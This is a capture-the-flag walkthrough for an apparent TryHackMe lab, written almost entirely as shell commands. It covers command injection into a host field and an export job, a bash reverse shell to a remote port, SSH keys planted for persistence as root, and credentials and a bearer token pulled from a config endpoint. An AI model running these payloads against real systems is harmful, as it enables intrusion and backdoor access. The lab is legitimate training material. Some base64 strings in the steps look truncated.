## TryHackMe room Infinity Pool https://tryhackme.com/room/hh-infinitypool-5b3548af
## YouTube video walk through: https://youtu.be/Fot5PhwLG3Y

```
127.0.0.1$(id)
127.0.0.1;id
127.0.0.1;id;#
```
```
127.0.0.1;/bin/bash -c '/bin/bash -i >& /dev/tcp/ip/5456 0>&1'
```
```
ssh-keygen -t rsa -b 2048 -f ./ctf_key -N ""
```
```
mkdir -p /home/web/.ssh
chmod 700 /home/web/.ssh
chmod 600 /home/web/.ssh/authorized_keys
```
```
base64 -w0 ctf_key.pub
```

```
host=127.0.0.1;mkdir -p /home/web/.ssh;echo c3NoLXJzYSBQ2MAo=|base64 -d > /home/web/.ssh/authorized_keys;chmod 700 /home/web/.ssh;chmod 600 /home/web/.ssh/authorized_keys;#
```
```
ssh -o IdentitiesOnly=yes -i ctf_key web@10.128.137.248
```
## root --
```
id
hostname
pwd
uname -a
cat /etc/os-release
```
```
sudo -l
```

##SUID executables
```
find / -perm -4000 -type f 2>/dev/null
```
##Linux capabilities
```
getcap -r / 2>/dev/null
```
##cron jobs
```
cat /etc/crontab
ls -la /etc/cron.d
systemctl list-timers --all --no-pager
```
```
ps auxww
```
gunicorn 3000 as svc-watch

##listening ports
```
ss -lntup
```

##services
```
/etc/systemd/system/
```
```
cat /etc/systemd/system/cc-automation.service
cat /etc/systemd/system/cc-watchtower.service
```
##automation unit
```
[Service]
User=root
Group=root
WorkingDirectory=/var/www/infinity_pool/automation
EnvironmentFile=/var/www/infinity_pool/automation/automation.env
ExecStart=/var/www/infinity_pool/automation/venv/bin/gunicorn \
    --workers 1 \
    --bind 127.0.0.1:9000 \
    wsgi:app
``` 
but: drwxr-x--- root root /var/www/infinity_pool/automation

##Query the root automation service
```
curl -sS http://127.0.0.1:9000/health
```

 Response:
```
  {
    "endpoints": {
      "GET /health": "service status",
      "POST /jobs/export": {
        "auth": "Authorization: Bearer <automation key>",
        "body": {
          "report": "<report name>"
        },
        "desc": "archive the latest data export"
      }
    },
    "runs_as": "root",
    "service": "automation",
    "status": "ok"
  }
```
==
##Watchtower service
```
curl -sS http://127.0.0.1:3000/
```
```
  /api/health
  /api/config
 ```
```
curl -sS http://127.0.0.1:3000/api/config 
```
```
  {
    "automation_endpoint": "http://127.0.0.1:9000",
    "note": "internal network only -- do not expose",
    "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
    "telephony_pass": "St4yN0t1c3d_2026",
    "telephony_portal": "http://127.0.0.1:8080/ucp",
    "telephony_user": "FreePBXUCPTemplateCreator"
  }
```
##Credentials:
```
  Username: FreePBXUCPTemplateCreator
  Password: St4yN0t1c3d_2026
```
##FreePBX hard-coded template credential issue, CVE-2026-46376
```
    /var/www/html/admin/modules/ucp/module.xml \
    /var/www/html/admin/modules/userman/module.xml |
```
##FreePBX UCP access


```
ssh -o IdentitiesOnly=yes -i ctf_key \
  -L 8080:127.0.0.1:8080 \
  web@10.129.152.181
```
```
http://127.0.0.1:8080/ucp/  
```
##Send a legitimate export request
```
curl -sS \
    -X POST \
    http://127.0.0.1:9000/jobs/export \
    -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
    -H 'Content-Type: application/json' \
    --data-binary '{"report":"latest"}'
```
```
{"command":"tar czf /var/automation/exports/latest.tgz /var/automation/data 2>&1","output":"tar: Removing leading `/' from member names\n"}    
```  
##The service constructed:
```
  tar czf /var/automation/exports/<report>.tgz /var/automation/data 2>&1    
 ``` 
##Because <report> was inserted directly into a shell command, it was command-injectable.  
```
next test: {"report":"test;id"}	
```
```
>>> x;id;# > {"report":"test;id;#"}
```
```
curl -sS \
    -X POST \
    http://127.0.0.1:9000/jobs/export \
    -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
    -H 'Content-Type: application/json' \
    --data-binary '{"report":"test;id;#"}'
```
```
root flag> {"report":"x;cat /root/root.txt;#"}
```
```
root shell base64 -w0 ctf_key.pub
```
PUB_B64='c3NoLXJm9zdHJvLTQ2MAo='
```
```
{"report":"x;mkdir -p /root/.ssh;echo $PUB_B64|base64 -d > /root/.ssh/authorized_keys;chmod 700 root/.ssh;chmod 600 /root/.ssh/authorized_keys;#"}
```
```
curl -sS -X POST \
  http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary "{\"report\":\"x;mkdir -p /root/.ssh;echo ${PUB_B64}|base64 -d >> /root/.ssh/authorized_keys;chmod 700 /root/.ssh;chmod 600 /root/.ssh/authorized_keys;#\"}"
```
```
ssh -o IdentitiesOnly=yes -i ctf_key root@10.128.137.248
```
